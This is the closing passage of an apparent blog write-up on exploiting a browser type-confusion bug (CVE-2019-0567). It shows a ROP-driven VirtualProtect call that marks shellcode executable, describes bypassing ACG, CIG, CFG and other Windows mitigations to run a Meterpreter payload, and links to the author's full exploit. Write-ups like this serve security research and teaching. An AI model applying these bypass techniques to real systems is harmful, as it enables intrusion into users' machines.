The last parameter is our page protection, which is `PAGE_EXECUTE_READWRITE`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion200.png" alt="">

We are now all setup!

```c
VirtualProtect(
	addressof(shellcode),				// The address of our already injected shellcode (we want this to be marked as RWX)
	sizeof(shellcode),				// The size of the memory we want to mark as RWX
	PAGE_EXECUTE_READWRITE,				// We want our shellcode to be RWX
	addressof(data_address) 			// Any writable address
);
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion201.png" alt="">

After executing the function call, we have marked our shellcode as RWX! We have successfully bypassed Arbitrary Code Guard and have generated dynamic RWX memory!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion202.png" alt="">

The last thing for us is to ensure execution reaches our shellcode. After executing the `VirtualProtect` function, let's see if we hit the last part of our ROP chain - which should push our shellcode address onto the stack, and return into it.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion203.png" alt="">

That's it! We have achieved our task and we now can execute our shellcode!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion204.png" alt="">

An exploit GIF shall suit us nicely here!

<img src="{{ site.url }}{{ site.baseurl }}/images/final_acg_exploit.gif" alt="">



Meterpreter is also loaded as a reflective, in memory DLL - meaning we have also taken care of CIG as well! That makes for DEP, ASLR, CFG, ACG, CIG, and no-child process mitigation bypasses! No wonder this post was so long!

Conclusion
---
This was an extremely challenging and rewarding task. Browser exploitation has been a thorn in my side for a long time, and I am very glad I now understand the basics. I do not yet know what is in my future, but if it is close to this level of complexity (I, at least, thought it was complex) I should be in for a treat! It is 4 a.m., so I am signing off now. Here is the final [exploit on my GitHub](https://github.com/connormcgarr/Exploit-Development/blob/master/Browser/CVE-2019-0567.html).

Peace, love, and positivity :-)
